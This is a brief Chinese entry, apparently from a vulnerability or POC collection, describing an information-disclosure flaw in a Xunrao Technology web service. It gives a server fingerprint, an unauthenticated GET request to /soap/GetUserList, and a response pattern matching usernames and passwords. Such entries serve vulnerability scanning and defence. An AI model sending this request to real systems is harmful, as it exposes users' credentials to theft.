# 迅饶科技GetUserList信息泄露漏洞

迅饶科技GetUserList ｜ 信息泄露 ｜ —
- **指纹**：`server="SunFull-Webs"`
- **请求**：`GET /soap/GetUserList HTTP/1.1`
- **响应特征**：200 ^(?=.*?USERNAME)(?=.*?PASSWORD).*?$